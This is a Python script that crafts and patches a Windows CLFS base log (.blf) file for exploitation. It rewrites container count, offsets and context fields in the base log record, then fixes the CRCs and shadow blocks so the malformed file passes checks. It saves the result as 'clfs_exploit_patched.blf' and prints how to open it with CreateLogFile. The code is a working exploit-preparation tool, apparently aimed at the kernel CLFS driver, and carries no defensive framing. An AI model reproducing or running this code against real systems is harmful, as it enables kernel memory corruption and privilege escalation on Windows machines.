#!/usr/bin/env python3
import ctypes
import ctypes.wintypes as wt
import os
import struct
import sys
import zlib
import uuid
import shutil
import tempfile

CLFS_FLAG_FORCE_FILE = 0x01
GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
FILE_SHARE_READ = 0x00000001
FILE_SHARE_WRITE = 0x00000002
CREATE_NEW = 1
CREATE_ALWAYS = 2
OPEN_EXISTING = 3
OPEN_ALWAYS = 4
INVALID_HANDLE = ctypes.c_void_p(-1)

CLFS_MAJOR_VERSION = 21
CLFS_MINOR_VERSION = 0
CLFS_FLAGS_VALUE = 0x00000001
CLFS_LSN_INVALID = 0xFFFFFFFFFFFFFFFF
CLFS_CONTROL_MAGIC = 0xC1F5C1F500005F1C
CLFS_CONTAINER_MAGIC = 0xC1FDF008
CLFS_CONTAINER_NODE_SIZE = 48
CLFS_MIN_CONTAINER_OFFSET = 0x1368
RAW_SECTOR_SIZE = 512
BLOCK_HEADER_SIZE = 0x70
DATA_OFFSET_IN_HEADER = 0x70

BLOCK_SIZES = [0x400, 0x400, 0x7A00, 0x7A00, 0x200, 0x200]
BLOCK_FILE_OFFSETS = [0x0000, 0x0400, 0x0800, 0x8200, 0xFC00, 0xFE00]
BLOCK_TYPES = [0, 1, 2, 3, 4, 5]
BLOCK_NAMES = ["Control", "CtrlShadow", "BaseLog", "BaseShadow", "Trailer", "TrlShadow"]

CCONTAINERS_OFFSET = 300
RGCONTAINERS_OFFSET = 808
RGCONTAINERS_MAX = 1024
CONTAINER_CONTEXT_SIZE = 48


def u16(data, off):
    return struct.unpack_from('<H', data, off)[0]

def u32(data, off):
    return struct.unpack_from('<I', data, off)[0]

def u64(data, off):
    return struct.unpack_from('<Q', data, off)[0]

def put_u16(data, off, val):
    struct.pack_into('<H', data, off, val & 0xFFFF)

def put_u32(data, off, val):
    struct.pack_into('<I', data, off, val & 0xFFFFFFFF)

def put_u64(data, off, val):
    struct.pack_into('<Q', data, off, val & 0xFFFFFFFFFFFFFFFF)

def compute_block_crc(block_data, num_sectors):
    buf = bytearray(block_data[:num_sectors * RAW_SECTOR_SIZE])
    put_u32(buf, 0x0C, 0)
    crc = zlib.crc32(bytes(buf)) & 0xFFFFFFFF
    return crc

def stamp_sector_signatures(block_data, num_sectors, build_version=1):
    buf = bytearray(block_data)
    for i in range(num_sectors):
        sec_off = i * RAW_SECTOR_SIZE
        if sec_off + 512 <= len(buf):
            buf[sec_off + 510] = 0x00
            buf[sec_off + 511] = build_version
    return bytes(buf)

def build_block_header(csectors, block_type, data_offset=None):
    hdr = bytearray(BLOCK_HEADER_SIZE)
    hdr[0] = CLFS_MAJOR_VERSION
    hdr[1] = CLFS_MINOR_VERSION
    put_u16(hdr, 0x02, 1)
    put_u16(hdr, 0x04, csectors)
    put_u16(hdr, 0x06, csectors)
    put_u32(hdr, 0x0C, 0)
    put_u32(hdr, 0x10, CLFS_FLAGS_VALUE)
    put_u64(hdr, 0x18, CLFS_LSN_INVALID)
    put_u64(hdr, 0x20, CLFS_LSN_INVALID)
    put_u32(hdr, 0x28, 0)
    put_u32(hdr, 0x2C, DATA_OFFSET_IN_HEADER)
    if data_offset is not None:
        put_u32(hdr, 0x68, data_offset)
    else:
        sig_area = (2 * csectors + 7) & ~7
        put_u32(hdr, 0x68, (csectors * RAW_SECTOR_SIZE) - sig_area)
    return bytes(hdr)

def build_control_record():
    rec = bytearray(0x400 - BLOCK_HEADER_SIZE)
    put_u32(rec, 0x00, 1)
    put_u64(rec, 0x08, CLFS_CONTROL_MAGIC)
    rec[0x10] = 1
    put_u16(rec, 0x48, 6)
    desc_off = 80
    for i in range(6):
        doff = desc_off + 24 * i
        put_u64(rec, doff, 0)
        put_u32(rec, doff + 8, BLOCK_SIZES[i])
        put_u32(rec, doff + 12, BLOCK_FILE_OFFSETS[i])
        put_u64(rec, doff + 16, BLOCK_TYPES[i])
    return bytes(rec)

def build_base_log_record(container_offset=None, container_index=0):
    rec = bytearray(0x7A00 - BLOCK_HEADER_SIZE)
    put_u32(rec, 0x00, 1)
    guid_bytes = uuid.uuid4().bytes_le
    rec[8:24] = guid_bytes
    put_u32(rec, 292, 1)
    put_u16(rec, 4914, 1)
    put_u16(rec, 4915, 1)
    put_u32(rec, 4904, 0)
    if container_offset is not None:
        put_u32(rec, CCONTAINERS_OFFSET, 1)
        put_u32(rec, RGCONTAINERS_OFFSET, container_offset)
        sym_off = container_offset - 16
        put_u32(rec, sym_off, container_offset + CONTAINER_CONTEXT_SIZE)
        put_u32(rec, sym_off + 4, container_offset)
        ctx_off = container_offset
        put_u32(rec, ctx_off, CLFS_CONTAINER_MAGIC)
        put_u32(rec, ctx_off + 4, CONTAINER_CONTEXT_SIZE)
        put_u64(rec, ctx_off + 8, 0)
        put_u32(rec, ctx_off + 16, container_index)
        put_u32(rec, ctx_off + 20, 0xFFFFFFFF)
        put_u64(rec, ctx_off + 24, 0)
        put_u64(rec, ctx_off + 36, 1)
        put_u32(rec, ctx_off + 44, 0)
    return bytes(rec)

def build_trailer_block():
    block = bytearray(BLOCK_SIZES[4])
    hdr = build_block_header(1, 4)
    block[:len(hdr)] = hdr
    return bytes(block)

def craft_blf_from_scratch(output_path, container_offset=None, container_index=0):
    if container_offset is None:
        container_offset = 0x7960
    file_data = bytearray(0x10000)
    for i in range(6):
        blk = bytearray(BLOCK_SIZES[i])
        csectors = BLOCK_SIZES[i] // RAW_SECTOR_SIZE
        hdr = build_block_header(csectors, BLOCK_TYPES[i])
        blk[:len(hdr)] = hdr
        if i == 0:
            ctrl = build_control_record()
            blk[BLOCK_HEADER_SIZE:BLOCK_HEADER_SIZE + len(ctrl)] = ctrl
        elif i == 2:
            base = build_base_log_record(container_offset, container_index)
            blk[BLOCK_HEADER_SIZE:BLOCK_HEADER_SIZE + len(base)] = base
        blk = bytearray(stamp_sector_signatures(bytes(blk), csectors))
        crc = compute_block_crc(bytes(blk), csectors)
        put_u32(blk, 0x0C, crc)
        if i == 1:
            blk[:] = file_data[BLOCK_FILE_OFFSETS[0]:BLOCK_FILE_OFFSETS[0] + BLOCK_SIZES[0]]
        elif i == 3:
            blk[:] = file_data[BLOCK_FILE_OFFSETS[2]:BLOCK_FILE_OFFSETS[2] + BLOCK_SIZES[2]]
        elif i == 5:
            blk[:] = file_data[BLOCK_FILE_OFFSETS[4]:BLOCK_FILE_OFFSETS[4] + BLOCK_SIZES[4]]
        file_data[BLOCK_FILE_OFFSETS[i]:BLOCK_FILE_OFFSETS[i] + BLOCK_SIZES[i]] = blk
    with open(output_path, 'wb') as f:
        f.write(bytes(file_data))
    return output_path

def create_blf_via_api(desired_path, container_size=0x100000):
    try:
        clfs = ctypes.WinDLL('clfsw32.dll')
    except OSError:
        return None
    CreateLogFile = clfs.CreateLogFile
    CreateLogFile.restype = ctypes.c_void_p
    CreateLogFile.argtypes = [wt.LPCWSTR, wt.DWORD, wt.DWORD, ctypes.c_void_p,
                               wt.ULONG, wt.ULONG, wt.ULONG, wt.ULONG,
                               ctypes.c_void_p, wt.ULONG, wt.ULONG, wt.ULONG]
    kernel32 = ctypes.windll.kernel32
    log_path = 'LOG:' + desired_path
    if os.path.exists(desired_path):
        os.remove(desired_path)
    actual_path = desired_path + '.blf'
    if os.path.exists(actual_path):
        os.remove(actual_path)
    h = CreateLogFile(log_path, GENERIC_READ | GENERIC_WRITE,
                      FILE_SHARE_READ | FILE_SHARE_WRITE, None,
                      CLFS_FLAG_FORCE_FILE, CREATE_NEW, 0,
                      container_size, None, 0, 0, 0)
    gle = kernel32.GetLastError()
    if h is None or int(h) in (0, -1):
        return None
    kernel32.CloseHandle(h)
    if os.path.exists(actual_path):
        return actual_path
    if os.path.exists(desired_path):
        return desired_path
    return None

def patch_blf_for_exploit(blf_path, container_offset=None, container_index=0,
                           container_size_value=0x100000):
    if container_offset is None:
        container_offset = 0x7960
    with open(blf_path, 'rb') as f:
        data = bytearray(f.read())
    if len(data) < 0x10000:
        return None
    blk2_off = BLOCK_FILE_OFFSETS[2]
    blk2_size = BLOCK_SIZES[2]
    csectors = blk2_size // RAW_SECTOR_SIZE
    data_off = DATA_OFFSET_IN_HEADER
    base_rec_off = blk2_off + data_off
    put_u32(data, base_rec_off + CCONTAINERS_OFFSET, 1)
    put_u32(data, base_rec_off + RGCONTAINERS_OFFSET, container_offset)
    sym_off = base_rec_off + container_offset - 16
    put_u32(data, sym_off, container_offset + CONTAINER_CONTEXT_SIZE)
    put_u32(data, sym_off + 4, container_offset)
    ctx_off = base_rec_off + container_offset
    put_u32(data, ctx_off, CLFS_CONTAINER_MAGIC)
    put_u32(data, ctx_off + 4, CONTAINER_CONTEXT_SIZE)
    put_u64(data, ctx_off + 8, container_size_value)
    put_u32(data, ctx_off + 16, container_index)
    put_u32(data, ctx_off + 20, 0xFFFFFFFF)
    put_u64(data, ctx_off + 24, 0)
    put_u64(data, ctx_off + 36, 1)
    put_u32(data, ctx_off + 44, 0)
    blk2_data = bytes(data[blk2_off:blk2_off + blk2_size])
    crc = compute_block_crc(blk2_data, csectors)
    put_u32(data, blk2_off + 0x0C, crc)
    blk3_off = BLOCK_FILE_OFFSETS[3]
    data[blk3_off:blk3_off + blk2_size] = data[blk2_off:blk2_off + blk2_size]
    blk0_off = BLOCK_FILE_OFFSETS[0]
    blk0_size = BLOCK_SIZES[0]
    blk1_off = BLOCK_FILE_OFFSETS[1]
    data[blk1_off:blk1_off + blk0_size] = data[blk0_off:blk0_off + blk0_size]
    blk4_off = BLOCK_FILE_OFFSETS[4]
    blk4_size = BLOCK_SIZES[4]
    blk5_off = BLOCK_FILE_OFFSETS[5]
    data[blk5_off:blk5_off + blk4_size] = data[blk4_off:blk4_off + blk4_size]
    with open(blf_path, 'wb') as f:
        f.write(bytes(data))
    return blf_path

def verify_blf(blf_path):
    with open(blf_path, 'rb') as f:
        data = f.read()
    results = []
    if len(data) != 0x10000:
        results.append("FAIL: file size %d != 65536" % len(data))
        return results
    for i in range(6):
        off = BLOCK_FILE_OFFSETS[i]
        sz = BLOCK_SIZES[i]
        major = data[off]
        csec = u16(data, off + 4)
        tsec = u16(data, off + 6)
        crc_stored = u32(data, off + 0x0C)
        flags = u32(data, off + 0x10)
        csec_expected = sz // RAW_SECTOR_SIZE
        blk = data[off:off + sz]
        crc_calc = compute_block_crc(blk, csec_expected)
        crc_match = "OK" if crc_stored == crc_calc else "MISMATCH(calc=0x%08X)" % crc_calc
        results.append("Block%d(%s) @0x%04X: major=%d cSec=%d/%d tSec=%d flags=0x%X crc=%s" % (
            i, BLOCK_NAMES[i], off, major, csec, csec_expected, tsec, flags, crc_match))
    ctrl_magic = u64(data, 0x70 + 8)
    results.append("Control magic: 0x%016X %s" % (
        ctrl_magic, "OK" if ctrl_magic == CLFS_CONTROL_MAGIC else "WRONG"))
    base_off = BLOCK_FILE_OFFSETS[2] + DATA_OFFSET_IN_HEADER
    ccont = u32(data, base_off + CCONTAINERS_OFFSET)
    rg0 = u32(data, base_off + RGCONTAINERS_OFFSET)
    results.append("cContainers=%d rgContainers[0]=0x%X" % (ccont, rg0))
    if ccont > 0 and rg0 > 0:
        ctx_off = base_off + rg0
        magic = u32(data, ctx_off)
        nsz = u32(data, ctx_off + 4)
        cidx = u32(data, ctx_off + 16)
        results.append("ContainerCtx: magic=0x%08X nodeSize=%d index=%d" % (
            magic, nsz, cidx))
        node_cType = u32(data, ctx_off - 12)
        node_cbNode = u32(data, ctx_off - 16)
        results.append("NodeID: cType=0x%X(need=0x%X) cbNode=0x%X(need=0x%X)" % (
            node_cType, rg0, node_cbNode, rg0 + CONTAINER_CONTEXT_SIZE))
    return results

def main():
    print("=== CLFS .BLF File Crafter ===")
    print()
    output_dir = tempfile.gettempdir()
    base_name = "clfs_exploit"
    desired_path = os.path.join(output_dir, base_name + ".blf")
    actual_path = desired_path + ".blf"
    print("[1] Attempting to create .blf via CreateLogFile API...")
    api_created = create_blf_via_api(desired_path)
    if api_created and os.path.exists(api_created):
        print("    SUCCESS: Created %s (%d bytes)" % (api_created, os.path.getsize(api_created)))
        work_path = api_created
    else:
        print("    FAILED: API creation failed, crafting from scratch...")
        work_path = os.path.join(output_dir, base_name + "_crafted.blf")
        craft_blf_from_scratch(work_path)
        if os.path.exists(work_path):
            print("    SUCCESS: Crafted %s (%d bytes)" % (work_path, os.path.getsize(work_path)))
        else:
            print("    FATAL: Could not create .blf file")
            return 1
    print()
    print("[2] Verifying original .blf structure...")
    for line in verify_blf(work_path):
        print("    " + line)
    print()
    print("[3] Patching .blf for exploit...")
    container_offset = 0x7960
    patched_path = os.path.join(output_dir, base_name + "_patched.blf")
    shutil.copy2(work_path, patched_path)
    result = patch_blf_for_exploit(patched_path, container_offset=container_offset,
                                    container_index=0, container_size_value=0x100000)
    if result:
        print("    SUCCESS: Patched %s (%d bytes)" % (result, os.path.getsize(result)))
    else:
        print("    FAILED: Patching failed")
        return 1
    print()
    print("[4] Verifying patched .blf...")
    for line in verify_blf(patched_path):
        print("    " + line)
    print()
    print("[5] Summary:")
    print("    Original : %s" % work_path)
    print("    Patched  : %s" % patched_path)
    print("    Container offset: 0x%X" % container_offset)
    print("    Container index : 0")
    print("    Container size  : 0x100000 (1MB)")
    print()
    print("    To use with CreateLogFile:")
    print('      CreateLogFile("LOG:%s", GENERIC_READ|GENERIC_WRITE,' % patched_path)
    print("        FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,")
    print("        CLFS_FLAG_FORCE_FILE, OPEN_EXISTING, 0, 0x100000, ...)")
    return 0

if __name__ == '__main__':
    sys.exit(main())
